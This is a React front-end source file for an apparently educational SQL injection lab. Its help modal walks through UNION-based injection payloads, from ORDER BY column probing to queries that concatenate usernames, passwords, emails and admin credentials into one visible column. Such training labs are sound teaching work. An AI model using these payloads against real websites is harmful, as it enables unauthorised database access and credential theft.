import React from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import Home from './Home';
import ProductDetail from './ProductDetail';
import './App.css';

function App() {
  return (
    <Router>
      <div className="app-container">
        <nav className="navbar navbar-expand-lg navbar-dark bg-primary">
          <div className="container">
            <a className="navbar-brand" href="/">SQL Injection Lab: Multiple Values in Single Column</a>
            <button className="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
              <span className="navbar-toggler-icon"></span>
            </button>
            <div className="collapse navbar-collapse" id="navbarNav">
              <ul className="navbar-nav ms-auto">
                <li className="nav-item">
                  <a className="nav-link" href="/" data-bs-toggle="modal" data-bs-target="#helpModal">
                    Help
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </nav>
        
        {/* Help Modal */}
        <div className="modal fade" id="helpModal" tabIndex="-1">
          <div className="modal-dialog modal-lg">
            <div className="modal-content">
              <div className="modal-header">
                <h5 className="modal-title">SQL Injection Multiple Values Lab</h5>
                <button type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
              </div>
              <div className="modal-body">
                <h4>Your objective:</h4>
                <ol>
                  <li>Identify that only product names are clearly visible (limited visibility)</li>
                  <li>Extract multiple user data fields in a single visible column</li>
                  <li>Use string concatenation to combine username, password, and email</li>
                </ol>
                
                <h4>Step 1: Discover limited visibility</h4>
                <p>Notice only 2 columns, but only product name is prominently displayed:</p>
                <ul>
                  <li><code>?search=laptop' ORDER BY 2--</code> (should work)</li>
                  <li><code>?search=laptop' ORDER BY 3--</code> (should fail)</li>
                </ul>
                
                <h4>Step 2: Try single value extraction (the problem)</h4>
                <ul>
                  <li><code>?search=laptop' UNION SELECT NULL,username FROM users--</code> (only shows usernames)</li>
                  <li><code>?search=laptop' UNION SELECT NULL,password FROM users--</code> (only shows passwords)</li>
                </ul>
                
                <h4>Step 3: Use concatenation (the solution)</h4>
                <ul>
                  <li><code>?search=laptop' UNION SELECT NULL,username||':'||password FROM users--</code></li>
                  <li><code>?search=laptop' UNION SELECT NULL,username||':'||password||':'||email FROM users--</code></li>
                  <li><code>?search=laptop' UNION SELECT NULL,'Admin: '||admin_username||' | Pass: '||admin_password FROM admin_users--</code></li>
                </ul>
                
                <div className="alert alert-warning">
                  This is a purposely vulnerable application for educational purposes. Never apply these techniques on real websites without permission!
                </div>
              </div>
              <div className="modal-footer">
                <button type="button" className="btn btn-secondary" data-bs-dismiss="modal">Close</button>
              </div>
            </div>
          </div>
        </div>
        
        <div className="container py-4">
          <Routes>
            <Route path="/" element={<Home />} />
            <Route path="/product/:id" element={<ProductDetail />} />
          </Routes>
        </div>
      </div>
    </Router>
  );
}

export default App;